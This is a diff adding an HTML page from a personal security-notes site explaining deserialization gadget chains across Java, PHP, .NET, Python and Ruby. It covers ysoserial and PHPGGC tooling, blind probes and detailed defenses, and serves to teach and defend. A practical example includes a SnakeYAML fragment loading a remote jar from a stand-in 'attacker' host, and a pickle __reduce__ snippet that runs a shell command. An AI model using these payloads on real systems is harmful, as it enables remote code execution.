@@ -1,0 +1,360 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Gadget Chains</title>
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="stylesheet" href="../../assets/pygments.css">
+</head>
+<body data-root="../..">
+<header class="topbar">
+  <a class="brand" href="../../index.html">ldamoredev notes</a>
+  <input id="search" type="search" placeholder="Search notes…" autocomplete="off">
+  <button id="theme-toggle" title="Toggle theme">◐</button>
+</header>
+<div id="search-results" hidden></div>
+<div class="layout">
+<nav class="sidebar">
+<a class="sidebar-home" href="../../index.html">Home</a>
+<div class="sidebar-section"><h3>Cybersecurity</h3>
+<a class="" href="../index.html">Cybersecurity Index</a>
+<a class="" href="../reference-registry.html">Cybersecurity Reference Registry</a>
+<a class="" href="../reference-registry-api-security.html">Reference Registry — API Security Seed</a>
+<a class="" href="../reference-registry-attack-surface-mapping.html">Reference Registry — Attack Surface Mapping Seed</a>
+<a class="" href="../reference-registry-cloud-security.html">Reference Registry — Cloud Security</a>
+<a class="" href="../reference-registry-devsecops.html">Reference Registry — DevSecOps Seed</a>
+<a class="" href="../reference-registry-linux-privilege-escalation.html">Reference Registry — Linux Privilege Escalation</a>
+<a class="" href="../reference-registry-networking.html">Reference Registry — Networking Seed</a>
+<a class="" href="../reference-registry-offensive-security-recon.html">Reference Registry — Offensive Security / Recon Seed</a>
+<a class="" href="../reference-registry-osint.html">Reference Registry — OSINT</a>
+<a class="" href="../reference-registry-playbooks.html">Reference Registry — Playbooks Seed</a>
+<a class="" href="../reference-registry-web-security.html">Reference Registry — Web Security Seed</a>
+<a class="" href="../reference-registry-wireless-security.html">Reference Registry — Wireless Security</a>
+<details><summary>api-security</summary>
+<a class="" href="../api-security/index.html">API Security Index</a>
+<a class="" href="../api-security/api-auth-flaws.html">API Authentication Flaws</a>
+<a class="" href="../api-security/api-inventory-management.html">API Inventory Management</a>
+<a class="" href="../api-security/api-rate-limiting.html">API Rate Limiting</a>
+<a class="" href="../api-security/api-security-top-10.html">API Security Top 10</a>
+<a class="" href="../api-security/authorization.html">Authorization</a>
+<a class="" href="../api-security/broken-authentication.html">Broken Authentication</a>
+<a class="" href="../api-security/broken-function-level-authorization.html">Broken Function Level Authorization</a>
+<a class="" href="../api-security/broken-object-level-authorization.html">Broken Object Level Authorization</a>
+<a class="" href="../api-security/broken-object-property-level-authorization.html">Broken Object Property Level Authorization</a>
+<a class="" href="../api-security/excessive-data-exposure.html">Excessive Data Exposure</a>
+<a class="" href="../api-security/jwt-attacks.html">JWT Attacks</a>
+<a class="" href="../api-security/mass-assignment.html">Mass Assignment</a>
+<a class="" href="../api-security/polymorphic-deserialization.html">Polymorphic Deserialization</a>
+<a class="" href="../api-security/token-lifecycle.html">Token Lifecycle</a>
+</details>
+<details><summary>attack-surface-mapping</summary>
+<a class="" href="../attack-surface-mapping/index.html">Attack Surface Mapping Index</a>
+<a class="" href="../attack-surface-mapping/admin-interface-discovery.html">Admin Interface Discovery</a>
+<a class="" href="../attack-surface-mapping/attack-surface-mapping.html">Attack Surface Mapping</a>
+<a class="" href="../attack-surface-mapping/deprecated-api-versions.html">Deprecated API Versions</a>
+<a class="" href="../attack-surface-mapping/endpoint-discovery.html">Endpoint Discovery</a>
+<a class="" href="../attack-surface-mapping/exposed-service-triage.html">Exposed Service Triage</a>
+<a class="" href="../attack-surface-mapping/exposed-storage.html">Exposed Storage</a>
+<a class="" href="../attack-surface-mapping/external-attack-surface.html">External Attack Surface</a>
+<a class="" href="../attack-surface-mapping/internal-attack-surface.html">Internal Attack Surface</a>
+<a class="" href="../attack-surface-mapping/subdomain-takeover.html">Subdomain Takeover</a>
+<a class="" href="../attack-surface-mapping/third-party-exposure.html">Third-Party Exposure</a>
+</details>
+<details><summary>cloud-security</summary>
+<a class="" href="../cloud-security/index.html">Cloud Security Index</a>
+<a class="" href="../cloud-security/cloud-dns-and-certbot.html">Cloud DNS and Certbot</a>
+<a class="" href="../cloud-security/cloud-iam-boundaries.html">Cloud IAM Boundaries</a>
+<a class="" href="../cloud-security/cloud-lab-infrastructure.html">Cloud Lab Infrastructure</a>
+<a class="" href="../cloud-security/cloud-logging-and-detection.html">Cloud Logging and Detection</a>
+<a class="" href="../cloud-security/cloud-metadata-security.html">Cloud Metadata Security</a>
+<a class="" href="../cloud-security/cloud-network-boundaries.html">Cloud Network Boundaries</a>
+<a class="" href="../cloud-security/cloud-secrets-management.html">Cloud Secrets Management</a>
+<a class="" href="../cloud-security/cloud-security-basics.html">Cloud Security Basics</a>
+<a class="" href="../cloud-security/public-cloud-storage-exposure.html">Public Cloud Storage Exposure</a>
+<a class="" href="../cloud-security/ssh-access-to-cloud-hosts.html">SSH Access to Cloud Hosts</a>
+</details>
+<details><summary>devsecops</summary>
+<a class="" href="../devsecops/index.html">DevSecOps Index</a>
+<a class="" href="../devsecops/artifact-integrity.html">Artifact Integrity</a>
+<a class="" href="../devsecops/asvs-as-dev-process-input.html">ASVS as Dev Process Input</a>
+<a class="" href="../devsecops/branch-protection-and-release-controls.html">Branch Protection and Release Controls</a>
+<a class="" href="../devsecops/ci-cd-hardening.html">CI/CD Hardening</a>
+<a class="" href="../devsecops/container-security.html">Container Security</a>
+<a class="" href="../devsecops/dependency-risk.html">Dependency Risk</a>
+<a class="" href="../devsecops/image-scanning.html">Image Scanning</a>
+<a class="" href="../devsecops/nist-ssdf.html">NIST SSDF</a>
+<a class="" href="../devsecops/sbom-and-provenance.html">SBOM and Provenance</a>
+<a class="" href="../devsecops/secrets-management.html">Secrets Management</a>
+<a class="" href="../devsecops/secure-by-design.html">Secure by Design</a>
+<a class="" href="../devsecops/supply-chain-security.html">Supply Chain Security</a>
+</details>
+<details><summary>linux-privilege-escalation</summary>
+<a class="" href="../linux-privilege-escalation/index.html">Linux Privilege Escalation Index</a>
+<a class="" href="../linux-privilege-escalation/cron-and-timer-abuse.html">Cron and Timer Abuse</a>
+<a class="" href="../linux-privilege-escalation/kernel-exploit-triage.html">Kernel Exploit Triage</a>
+<a class="" href="../linux-privilege-escalation/linpeas-workflow.html">LinPEAS Workflow</a>
+<a class="" href="../linux-privilege-escalation/linux-capabilities.html">Linux Capabilities</a>
+<a class="" href="../linux-privilege-escalation/linux-enumeration.html">Linux Enumeration</a>
+<a class="" href="../linux-privilege-escalation/linux-privilege-escalation.html">Linux Privilege Escalation</a>
+<a class="" href="../linux-privilege-escalation/path-hijacking.html">PATH Hijacking</a>
+<a class="" href="../linux-privilege-escalation/sudo-misconfigurations.html">Sudo Misconfigurations</a>
+<a class="" href="../linux-privilege-escalation/suid-sgid-misconfigurations.html">SUID and SGID Misconfigurations</a>
+</details>
+<details><summary>networking</summary>
+<a class="" href="../networking/index.html">Networking Index</a>
+<a class="" href="../networking/caching-and-security.html">Caching and Security</a>
+<a class="" href="../networking/client-ip-trust.html">Client IP Trust</a>
+<a class="" href="../networking/metadata-endpoints.html">Cloud Instance Metadata Endpoints</a>
+<a class="" href="../networking/cookies-and-sessions.html">Cookies and Sessions</a>
+<a class="" href="../networking/dangling-dns-records.html">Dangling DNS Records</a>
+<a class="" href="../networking/dns-resolution.html">DNS Resolution</a>
+<a class="" href="../networking/dns-security.html">DNS Security</a>
+<a class="" href="../networking/firewalls-and-network-boundaries.html">Firewalls and Network Boundaries</a>
+<a class="" href="../networking/http-headers.html">HTTP Headers</a>
+<a class="" href="../networking/http-messages.html">HTTP Messages</a>
+<a class="" href="../networking/http-overview.html">HTTP Overview</a>
+<a class="" href="../networking/load-balancers.html">Load Balancers</a>
+<a class="" href="../networking/nat-and-private-networks.html">NAT and Private Networks</a>
+<a class="" href="../networking/nmap-scanning.html">Nmap Scanning</a>
+<a class="" href="../networking/packet-analysis.html">Packet Analysis</a>
+<a class="" href="../networking/ports-and-services.html">Ports and Services</a>
+<a class="" href="../networking/reverse-proxies.html">Reverse Proxies</a>
+<a class="" href="../networking/service-enumeration.html">Service Enumeration</a>
+<a class="" href="../networking/tcp-ip-basics.html">TCP/IP Basics</a>
+<a class="" href="../networking/tls-https.html">TLS and HTTPS</a>
+<a class="" href="../networking/wireshark-workflows.html">Wireshark Workflows</a>
+</details>
+<details><summary>offensive-security</summary>
+<a class="" href="../offensive-security/index.html">Offensive Security / Recon Index</a>
+<a class="" href="../offensive-security/active-recon.html">Active Recon</a>
+<a class="" href="../offensive-security/company-mapping.html">Company Mapping</a>
+<a class="" href="../offensive-security/enumeration.html">Enumeration</a>
+<a class="" href="../offensive-security/host-and-port-discovery.html">Host and Port Discovery</a>
+<a class="" href="../offensive-security/passive-recon.html">Passive Recon</a>
+<a class="" href="../offensive-security/public-asset-discovery.html">Public Asset Discovery</a>
+<a class="" href="../offensive-security/recon.html">Recon</a>
+<a class="" href="../offensive-security/recon-to-testing-handoff.html">Recon to Testing Handoff</a>
+<a class="" href="../offensive-security/scope-validation.html">Scope Validation</a>
+<a class="" href="../offensive-security/service-validation.html">Service Validation</a>
+<a class="" href="../offensive-security/subdomain-enumeration.html">Subdomain Enumeration</a>
+<a class="" href="../offensive-security/tech-stack-fingerprinting.html">Tech Stack Fingerprinting</a>
+</details>
+<details><summary>osint</summary>
+<a class="" href="../osint/index.html">OSINT Index</a>
+<a class="" href="../osint/breach-and-leak-intelligence.html">Breach and Leak Intelligence</a>
+<a class="" href="../osint/company-osint.html">Company OSINT</a>
+<a class="" href="../osint/email-and-phone-osint.html">Email and Phone OSINT</a>
+<a class="" href="../osint/google-dorking.html">Google Dorking</a>
+<a class="" href="../osint/image-and-location-osint.html">Image and Location OSINT</a>
+<a class="" href="../osint/osint.html">OSINT</a>
+<a class="" href="../osint/osint-reporting.html">OSINT Reporting</a>
+<a class="" href="../osint/osint-triage.html">OSINT Triage</a>
+<a class="" href="../osint/search-engine-operators.html">Search Engine Operators</a>
+<a class="" href="../osint/social-media-osint.html">Social Media OSINT</a>
+</details>
+<details><summary>security-playbooks</summary>
+<a class="" href="../security-playbooks/index.html">Security Playbooks Index</a>
+<a class="" href="../security-playbooks/break-jwt-validation.html">Break JWT Validation</a>
+<a class="" href="../security-playbooks/exploit-idor.html">Exploit IDOR</a>
+<a class="" href="../security-playbooks/exploit-sqli.html">Exploit SQL Injection</a>
+<a class="" href="../security-playbooks/inspect-file-upload-surface.html">Inspect File Upload Surface</a>
+<a class="" href="../security-playbooks/inspect-session-handling.html">Inspect Session Handling</a>
+<a class="" href="../security-playbooks/investigate-ssrf.html">Investigate SSRF</a>
+<a class="" href="../security-playbooks/reverse-proxy-misconfig-checklist.html">Reverse Proxy Misconfig Checklist</a>
+<a class="" href="../security-playbooks/test-client-ip-spoofing.html">Test Client IP Spoofing</a>
+<a class="" href="../security-playbooks/test-cors-behavior.html">Test CORS Behavior</a>
+<a class="" href="../security-playbooks/test-path-traversal.html">Test Path Traversal</a>
+</details>
+<details open><summary>web-security</summary>
+<a class="" href="index.html">Web Security Index</a>
+<a class="" href="auth-flaws.html">Authentication Flaws</a>
+<a class="" href="broken-access-control.html">Broken Access Control</a>
+<a class="" href="business-logic-vulnerabilities.html">Business Logic Vulnerabilities</a>
+<a class="" href="command-injection.html">Command Injection</a>
+<a class="" href="content-security-policy.html">Content Security Policy</a>
+<a class="" href="cors-misconfiguration.html">CORS Misconfiguration</a>
+<a class="" href="csrf.html">Cross-Site Request Forgery (CSRF)</a>
+<a class="" href="xss.html">Cross-Site Scripting (XSS)</a>
+<a class="" href="file-upload-abuse.html">File Upload Abuse</a>
+<a class="active" href="gadget-chains.html">Gadget Chains</a>
+<a class="" href="deserialization.html">Insecure Deserialization</a>
+<a class="" href="idor.html">Insecure Direct Object Reference (IDOR)</a>
+<a class="" href="oauth-security.html">OAuth Security</a>
+<a class="" href="open-redirect.html">Open Redirect</a>
+<a class="" href="owasp-top-10.html">OWASP Top 10</a>
+<a class="" href="path-traversal.html">Path Traversal</a>
+<a class="" href="phar-deserialization.html">PHAR Deserialization</a>
+<a class="" href="request-smuggling.html">Request Smuggling</a>
+<a class="" href="ssrf.html">Server-Side Request Forgery (SSRF)</a>
+<a class="" href="session-management.html">Session Management</a>
+<a class="" href="sql-injection.html">SQL Injection</a>
+<a class="" href="xxe.html">XXE</a>
+</details>
+<details><summary>wireless-security</summary>
+<a class="" href="../wireless-security/index.html">Wireless Security Index</a>
+<a class="" href="../wireless-security/arp-poisoning.html">ARP Poisoning</a>
+<a class="" href="../wireless-security/bettercap-workflows.html">Bettercap Workflows</a>
+<a class="" href="../wireless-security/evil-twin-access-points.html">Evil Twin Access Points</a>
+<a class="" href="../wireless-security/mitm-on-local-networks.html">MITM on Local Networks</a>
+<a class="" href="../wireless-security/wep-security.html">WEP Security</a>
+<a class="" href="../wireless-security/wifi-deauthentication.html">Wi-Fi Deauthentication</a>
+<a class="" href="../wireless-security/wifi-monitor-mode.html">Wi-Fi Monitor Mode</a>
+<a class="" href="../wireless-security/wifi-wordlist-attacks.html">Wi-Fi Wordlist Attacks</a>
+<a class="" href="../wireless-security/wireless-security.html">Wireless Security</a>
+<a class="" href="../wireless-security/wpa-wpa2-handshakes.html">WPA/WPA2 Handshakes</a>
+</details>
+</div>
+</nav>
+<main class="content">
+<div class="tags"><span class="tag">#cybersecurity</span> <span class="tag">#web-security</span> <span class="tag">#deserialization</span> <span class="tag">#rce</span></div>
+<article>
+<h1 id="gadget-chains">Gadget Chains</h1>
+<h2 id="definition">Definition</h2>
+<p>A gadget chain is a sequence of method invocations through <em>existing trusted code</em> that walks attacker-controlled data from a deserialization entry point to a dangerous sink. The attacker writes no new code on the target — they only choose which serialized object graph the deserializer reconstructs, and the chain is whatever methods that graph causes the runtime to invoke.</p>
+<h2 id="why-it-matters">Why it matters</h2>
+<p>The gadget-chain mental model is what separates a casual deserialization finding ("I tampered with a cookie") from a productized RCE primitive. It matters because:</p>
+<ul>
+<li>It explains why "we removed the vulnerable library" is a losing defense. Modern dependency trees contain hundreds of classes that can become a gadget link; new chains are published every year. Whack-a-mole on chains never converges.</li>
+<li>It transfers cleanly across attack classes. The same kick-off / intermediate / sink shape applies to JSON polymorphic deserialization (Jackson, Newtonsoft), XML binding (XStream), .NET <code>BinaryFormatter</code>, Python pickle, YAML loaders. If you can read the gadget-chain shape, you can read all of them.</li>
+<li>It clarifies the threat model. The application is not "executing the attacker's code" — it is calling its own legitimate methods on data that should never have been allowed to choose what gets called. The bug is the deserialization, not the chain.</li>
+<li>It teaches a transferable design lesson: <strong>reflective instantiation of attacker-named types is execution</strong>, even when the data format looks inert.</li>
+</ul>
+<h2 id="how-it-works">How it works</h2>
+<p>The chain has three named stages. All three are <em>existing code</em> on the target.</p>
+<ol>
+<li><strong>Kick-off gadget</strong> — a method the language runtime invokes automatically when reconstructing the object graph. PHP <code>__wakeup()</code> / <code>__destruct()</code>, Java <code>readObject(ObjectInputStream)</code>, Python <code>__reduce__</code>, Ruby <code>_load</code>, .NET <code>OnDeserialized</code> callbacks. The deserializer calls this with no application code in between.</li>
+<li><strong>Intermediate gadgets</strong> — methods invoked from the kick-off (or from each prior link) that pass attacker-controlled state forward. Often these are innocent-looking helpers: a logger that calls <code>toString()</code> on the message, a comparator that invokes <code>equals()</code>, a transformer that wraps a <code>Method.invoke()</code>. Each link does one ordinary operation; the chain is the composition.</li>
+<li><strong>Sink gadget</strong> — the final method where attacker-controlled state becomes a dangerous primitive: <code>Runtime.exec</code>, <code>eval</code>, <code>ProcessBuilder.start</code>, <code>URL.openStream</code>, <code>File.write</code>, reflective method invocation. RCE is the typical ceiling, but file write, SSRF, or auth bypass are also valid sinks.</li>
+</ol>
+<p>The canonical demonstration is the Apache Commons Collections <code>InvokerTransformer</code> chain in Java:
+- Kick-off: a <code>HashMap</code> whose <code>hashCode()</code> is invoked during <code>readObject</code>.
+- Intermediate: keys are <code>LazyMap</code> entries whose <code>get()</code> calls <code>ChainedTransformer.transform()</code>.
+- Sink: the final <code>InvokerTransformer</code> reflectively calls <code>Runtime.getRuntime().exec(cmd)</code>.</p>
+<p>The application contains no malicious code. It contains <code>HashMap</code>, <code>LazyMap</code>, and <code>InvokerTransformer</code>. Composing them is the bug.</p>
+<h2 id="techniques-patterns">Techniques / patterns</h2>
+<p>What attackers look at and how they probe:</p>
+<ul>
+<li><strong>Identify the deserialization format on the wire</strong> before reaching for chains. Java <code>rO0</code>/<code>ac ed</code>, PHP <code>O:N:"..."</code>, Python pickle opcodes (<code>(c__main__\n...</code>), .NET <code>AAEAAAD/////</code> (BinaryFormatter), Ruby Marshal <code>\x04\x08</code>, YAML <code>!!ruby/object:</code> or <code>!!python/object:</code>.</li>
+<li><strong>Confirm deserialization happens at all</strong> with a <em>universal</em> probe before searching for an application-specific chain:</li>
+<li><code>URLDNS</code> (ysoserial) — triggers a DNS lookup to attacker-controlled domain. Detectable via Burp Collaborator. Works against any Java target that calls <code>readObject</code>.</li>
+<li><code>JRMPClient</code> (ysoserial) — forces a TCP connectback. Works without specific gadgets.</li>
+<li>For PHP, a custom payload that calls <code>dns_get_record()</code> in a <code>__destruct()</code> of a known-loaded class.</li>
+<li><strong>Enumerate the classpath / loaded libraries</strong>. Common bug-bounty path: response headers leak server tech (<code>X-Powered-By: WildFly</code>), error pages leak stack traces with library names, source maps leak npm dependencies. Match the dependency list against ysoserial / PHPGGC chain catalogs.</li>
+<li><strong>Use the prebuilt tooling first</strong>. Hand-rolled chains are rarely necessary — start with:</li>
+<li><code>ysoserial</code> — Java, dozens of chains for Commons Collections (1–7), Spring 1/2, Groovy, Hibernate, JBoss, Hibernate, Jackson polymorphic, etc.</li>
+<li><code>PHPGGC</code> — PHP, chains for Laravel, Symfony, WordPress, Drupal, Monolog, Guzzle, Doctrine, Slim, etc.</li>
+<li><code>marshalsec</code> — JNDI / LDAP / RMI gadgets, polymorphic JSON/XML/YAML binders.</li>
+<li><strong>Hand-build a chain when the target's library set is unusual</strong>. The mental loop: pick a magic-method entry point that exists in any loaded class, walk the call graph forward looking for any method that does <em>something with input</em> (reflection, <code>Class.forName</code>, <code>eval</code>, file ops), then trace backward to the kick-off.</li>
+</ul>
+<h2 id="variants-and-bypasses">Variants and bypasses</h2>
+<h3 id="java-commons-collections-family">Java — Commons Collections family</h3>
+<p>The original. Versions 1–7 in ysoserial, each adapted to a slightly different version of Commons Collections. Sink is always reflective <code>Runtime.exec</code>. Triggers Apache Struts2 RCE (CVE-2017-9805 used XStream rather than native Java serialization, but the chain shape is identical), JBoss, WebSphere, Jenkins, OpenNMS, and dozens of enterprise products.</p>
+<h3 id="java-non-commons-chains">Java — non-Commons chains</h3>
+<ul>
+<li><strong>Spring 1 / 2</strong> — <code>DefaultListableBeanFactory</code> chains. Useful when Commons Collections is not on the classpath.</li>
+<li><strong>Groovy</strong> — <code>MethodClosure</code> lets the chain end at arbitrary method invocation.</li>
+<li><strong>Hibernate</strong> — <code>TypedValue</code> + <code>PojoComponentTuplizer</code> reach reflective execution.</li>
+<li><strong>JRE-only chains</strong> — newer ysoserial entries (<code>URLDNS</code>, <code>JRMPClient</code>) work on a vanilla JRE with no extra libraries. Limited sinks (DNS, TCP) but require zero dependency assumptions.</li>
+</ul>
+<h3 id="php-phpggc-families">PHP — PHPGGC families</h3>
+<p>Framework-specific chains that exploit the framework's own classes:
+- <strong>Laravel</strong> — chain ends in <code>Symfony\Component\HttpKernel\HttpKernelBrowser</code> or similar.
+- <strong>Monolog</strong> — <code>__destruct</code> on a logger reaches <code>proc_open</code> via a <code>BufferHandler</code>.
+- <strong>Guzzle</strong> — chain reaches HTTP request side-effects useful for SSRF.
+- <strong>WordPress / Drupal</strong> — application-specific chains that exploit plugin classes.</p>
+<h3 id="net-binaryformatter-and-losformatter">.NET — <code>BinaryFormatter</code> and <code>LosFormatter</code></h3>
+<ul>
+<li><code>BinaryFormatter</code> — Microsoft has officially deprecated it for exactly this reason; chains via <code>ObjectDataProvider</code>, <code>WindowsIdentity</code>, <code>System.Configuration.Install.AssemblyInstaller</code>.</li>
+<li><code>LosFormatter</code> — used by ASP.NET ViewState. Chains identical in shape; ysoserial.NET covers them.</li>
+<li><code>Json.NET</code> with <code>TypeNameHandling.All</code> reintroduces the same chain surface in JSON; see <a href="../api-security/polymorphic-deserialization.html">polymorphic-deserialization</a> for the JSON polymorphic case.</li>
+</ul>
+<h3 id="python-pickle-__reduce__">Python — pickle <code>__reduce__</code></h3>
+<p>Single-link "chain": <code>__reduce__</code> returns <code>(os.system, ("id",))</code> and the unpickler obediently calls it. Pickle is unique in that the format itself is a stack-based VM — gadget chains are barely needed. Treat any <code>pickle.loads()</code> on untrusted data as immediate RCE.</p>
+<h3 id="ruby-marshal-activesupport">Ruby — Marshal + ActiveSupport</h3>
+<p><code>Marshal.load</code> on attacker-controlled bytes plus a Rails app on the classpath gives chains via <code>ActionDispatch::Cookies::CookieJar</code> and <code>ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy</code>.</p>
+<h3 id="universal-blind-probes">Universal blind probes</h3>
+<p>When you cannot identify the library set, the universal chains (<code>URLDNS</code>, <code>JRMPClient</code> for Java; DNS-callback <code>__wakeup</code> for PHP) confirm deserialization happens and tell you to invest more effort. Always probe blind first.</p>
+<h2 id="impact">Impact</h2>
+<p>Severity matches the strength of the sink, not the existence of the chain:</p>
+<ul>
+<li><strong>RCE</strong> — sink reaches <code>exec</code>/<code>eval</code>/equivalent. Default ceiling for any chain reaching an OS-level primitive.</li>
+<li><strong>SSRF</strong> — sink reaches HTTP/URL primitives (<code>URLDNS</code>, Guzzle chains, .NET <code>WebClient</code>).</li>
+<li><strong>File read / write</strong> — sink reaches filesystem APIs (<code>File.write</code>, <code>fopen</code> in <code>w</code> mode).</li>
+<li><strong>Auth bypass / privilege escalation</strong> — chain modifies server-side authorization state (e.g., flipping <code>isAdmin</code> via reflective field write).</li>
+<li><strong>Denial of service</strong> — degenerate chains: nested object graphs, billion-laughs-style hash collisions in <code>HashMap</code> keys.</li>
+</ul>
+<h2 id="detection-and-defense">Detection and defense</h2>
+<p>Ordered by effectiveness:</p>
+<ol>
+<li>
+<p><strong>Don't deserialize untrusted input.</strong>
+   This is the only defense that addresses the class. If untrusted bytes never reach <code>readObject</code> / <code>unserialize</code> / <code>pickle.loads</code>, no chain can fire. Replace native serialization with data-only formats (JSON without polymorphic typing, Protobuf with explicit schemas, MessagePack) and reconstruct domain objects with explicit, type-checked code paths. Every other defense is a mitigation.</p>
+</li>
+<li>
+<p><strong>Verify integrity <em>before</em> deserializing.</strong>
+   HMAC the bytes with a server-only key; reject the payload outright if the signature does not match. The check must run on the bytes, not on a parsed-then-validated object — checks that run after deserialization are too late, because the kick-off gadget already fired. This is the standard pattern for "we must accept a typed cookie."</p>
+</li>
+<li>
+<p><strong>Apply a class allowlist at the deserializer level.</strong>
+   Java <code>ObjectInputFilter</code> (JEP 290), .NET <code>SerializationBinder</code>, Jackson <code>BasicPolymorphicTypeValidator</code>, Python <code>pickle.Unpickler.find_class</code> override. Each restricts which classes the deserializer is willing to instantiate. Maintain the list deliberately — every class added is an attack-surface decision. Allowlists shut down arbitrary-class injection even if the bytes are tampered with.</p>
+</li>
+<li>
+<p><strong>Replace generic serialization with class-specific methods.</strong>
+   Hand-rolled <code>serialize</code>/<code>deserialize</code> for each domain class lets you choose which fields cross the wire and validate types as you reconstruct. Prevents "the framework deserialized a private field you forgot existed."</p>
+</li>
+<li>
+<p><strong>Trim known gadget-chain libraries from the dependency tree.</strong>
+   Defense-in-depth, not primary defense. Removing Commons Collections from a classpath that does not need it is good hygiene; it is not a strategy. The chain set grows; the dependency tree drifts; the next ysoserial release changes the answer. See "what does not work" below.</p>
+</li>
+<li>
+<p><strong>Monitor for deserialization fingerprints in unexpected places.</strong>
+   Inbound traffic carrying <code>rO0</code>/<code>ac ed</code>/<code>O:</code>/PHP-PHAR/pickle opcodes/<code>AAEAAAD</code> where it should not appear is high-signal. WAF rules for these prefixes catch the off-the-shelf payloads even when the chain is novel.</p>
+</li>
+</ol>
+<h3 id="what-does-not-work-as-a-primary-defense">What does not work as a primary defense</h3>
+<ul>
+<li><strong>Removing one vulnerable library at a time.</strong> The chain set is not a fixed list. Apache Commons Collections was the canonical example for years; modern ysoserial has chains in plain JRE classes, in Spring, in Hibernate, in Groovy, in C3P0, in Hibernate, in BeanShell. New chains are published faster than dependency teams remove old ones. Do not budget defense around "we removed the chain library."</li>
+<li><strong>Validating after deserialization.</strong> The kick-off gadget runs during <code>readObject</code>. By the time the application sees the resulting object, the sink may have already executed.</li>
+<li><strong>Obfuscating or encrypting the format on the wire.</strong> Encryption defends against tampering only if the key is server-side and the integrity check runs <em>before</em> deserialization. If the key leaks or the cipher is malleable, the chain is back.</li>
+<li><strong>WAF signatures alone.</strong> WAFs catch base64 ysoserial payloads and known PHPGGC prefixes. They do not catch hand-built chains, custom-encoded payloads, or chains delivered through indirect paths (PHAR streams, JNDI lookups).</li>
+<li><strong>Java <code>SecurityManager</code>.</strong> Deprecated and removed in Java 17+. Even when present, it does not prevent the chain — it only restricts the sink's effect, and most chains reach sinks the SecurityManager does not gate.</li>
+</ul>
+<h2 id="practical-examples">Practical examples</h2>
+<ul>
+<li>An internal Java RPC service receiving serialized payloads over HTTP from "trusted" callers — attacker reaches the service through a misconfigured ingress and lands <code>ysoserial CommonsCollections5</code>.</li>
+<li>A legacy PHP forum's session cookie holds a serialized <code>User</code> — PHPGGC-built chain via the bundled Monolog dependency reaches <code>proc_open</code>.</li>
+<li>A .NET ASP.NET application using <code>BinaryFormatter</code> for ViewState — ysoserial.NET chain via <code>ObjectDataProvider</code>. Microsoft has flagged this as the top reason <code>BinaryFormatter</code> is deprecated.</li>
+<li>A Python ML inference server accepting pickled models from S3 — <code>__reduce__</code>-based payload runs as a single-link chain. The "chain" is just the unpickler honoring <code>__reduce__</code>.</li>
+<li>A SnakeYAML loader behind an admin import feature — YAML <code>!!java.net.URLClassLoader &lt;span class="broken-link" title="Unresolved: &amp;quot;http://attacker/x.jar&amp;quot;"&gt;x.jar&amp;quot;&lt;/span&gt;</code> constructs a class loader and triggers remote class load.</li>
+</ul>
+<h2 id="related-notes">Related notes</h2>
+<ul>
+<li><a href="deserialization.html">deserialization</a> — the parent concept; gadget chains are the exploitation half.</li>
+<li><a href="phar-deserialization.html">phar-deserialization</a> — the PHP-specific <em>trigger</em> for the kick-off, distinct from the chain itself.</li>
+<li><a href="../api-security/polymorphic-deserialization.html">Polymorphic deserialization</a> — the same chain shape reintroduced through JSON/XML/YAML binders.</li>
+<li><a href="file-upload-abuse.html">file-upload-abuse</a> — common delivery mechanism, especially for PHAR and pickle.</li>
+<li><a href="ssrf.html">ssrf</a> — the <code>URLDNS</code> family of chains is effectively SSRF-as-detection.</li>
+</ul>
+<h3 id="suggested-future-atomic-notes">Suggested future atomic notes</h3>
+<ul>
+<li><span class="broken-link" title="Unresolved: ysoserial-chains">ysoserial-chains</span></li>
+<li><span class="broken-link" title="Unresolved: phpggc-chains">phpggc-chains</span></li>
+<li><span class="broken-link" title="Unresolved: jndi-injection">jndi-injection</span></li>
+<li><span class="broken-link" title="Unresolved: binaryformatter-chains">binaryformatter-chains</span></li>
+<li><span class="broken-link" title="Unresolved: snakeyaml-chains">snakeyaml-chains</span></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><strong>Foundational:</strong> OWASP Deserialization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</li>
+<li><strong>Testing / Lab:</strong> PortSwigger Exploiting insecure deserialization — https://portswigger.net/web-security/deserialization/exploiting</li>
+<li><strong>Research / Deep Dive:</strong> Chris Frohoff &amp; Gabriel Lawrence, "Marshalling Pickles" (AppSecCali 2015, original ysoserial talk) — https://frohoff.github.io/appseccali-marshalling-pickles/</li>
+<li><strong>Official Tool Docs:</strong> ysoserial — https://github.com/frohoff/ysoserial</li>
+<li><strong>Official Tool Docs:</strong> PHPGGC — https://github.com/ambionics/phpggc</li>
+</ul>
+</article>
+</main>
+</div>
+<script src="../../assets/search.js"></script>
+</body>
+</html>
